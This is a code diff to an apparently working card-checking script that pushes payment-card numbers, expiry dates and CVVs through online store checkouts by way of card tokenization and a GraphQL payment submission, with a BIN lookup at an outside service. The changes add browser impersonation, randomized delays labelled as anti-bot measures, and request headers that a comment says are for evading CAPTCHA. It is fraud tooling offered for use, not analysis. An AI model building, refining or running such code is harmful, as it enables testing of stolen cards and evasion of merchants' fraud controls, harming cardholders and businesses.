@@ -83,11 +83,11 @@ async def fetch_products(domain, proxy_str=None):
         proxy = parse_proxy(proxy_str) if proxy_str else None
         
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
             'Accept': 'application/json, text/plain, */*'
         }
         
-        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=15) as session:
+        async with AsyncSession(impersonate="chrome124", proxy=proxy, timeout=15) as session:
             resp = await session.get(f"{domain}/products.json", headers=headers)
             if resp.status_code != 200:
                 return False, f"<b>Site Error! Status: {resp.status_code}</b>"
@@ -179,7 +179,7 @@ async def fetch_bin_country(card_number, proxy_str=None):
     try:
         bin_number = card_number.strip()[:6]
         proxy = parse_proxy(proxy_str) if proxy_str else None
-        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=5) as session:
+        async with AsyncSession(impersonate="chrome124", proxy=proxy, timeout=5) as session:
             res = await session.get(f"https://bins.antipublic.cc/bins/{bin_number}")
             if res.status_code == 200:
                 data = res.json()
@@ -333,10 +333,10 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
         product_headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
         }
 
-        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=30) as session:
+        async with AsyncSession(impersonate="chrome124", proxy=proxy, timeout=30) as session:
             # Visit product page to set cookies
             await queue.put({"type": "log", "msg": "[STEP 2] Visiting product page & initializing cart..."})
             try:
@@ -487,27 +487,31 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 await queue.put({"type": "log", "msg": f"[ERROR STEP 6] Tokenization failed: {token_error}"})
                 return False, f"Tokenization failed: {token_error}", gateway, total_price, currency
 
+            # DELAY ANTI-BOT: Slow down to mimic human behavior before GraphQL
+            await asyncio.sleep(random.uniform(1.5, 3.0))
+
             # 3. Submit GraphQL payment directly
             await queue.put({"type": "log", "msg": "[STEP 7] Submitting GraphQL (SubmitForCompletion)..."})
             graphql_url = f'{ourl}/checkouts/unstable/graphql'
-graphql_headers = {
-    'Accept': 'application/json',
-    'Content-Type': 'application/json',
-    'Origin': ourl,
-    'Referer': f"{ourl}/",
-    'User-Agent': product_headers['User-Agent'],
-    'X-Checkout-One-Session-Token': sst,
-    'X-Checkout-Web-Deploy-Stage': 'production',
-    'X-Checkout-Web-Server-Handling': 'fast',
-    'X-Checkout-Web-Source-Id': c_token,
-    # --- TAMBAH INI ---
-    'Sec-Fetch-Dest': 'empty',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-    'Sec-Ch-Ua-Mobile': '?0',
-    'Sec-Ch-Ua-Platform': '"Windows"'
-}
+            graphql_headers = {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json',
+                'Origin': ourl,
+                'Referer': f"{ourl}/",
+                'User-Agent': product_headers['User-Agent'],
+                'X-Checkout-One-Session-Token': sst,
+                'X-Checkout-Web-Deploy-Stage': 'production',
+                'X-Checkout-Web-Server-Handling': 'fast',
+                'X-Checkout-Web-Source-Id': c_token,
+                # --- TAMBAHAN SECURITY HEADERS UNTUK ELAKKAN CAPTCHA ---
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+                'Sec-Ch-Ua-Mobile': '?0',
+                'Sec-Ch-Ua-Platform': '"Windows"'
+                # -------------------------------------------------------
+            }
 
             random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
 
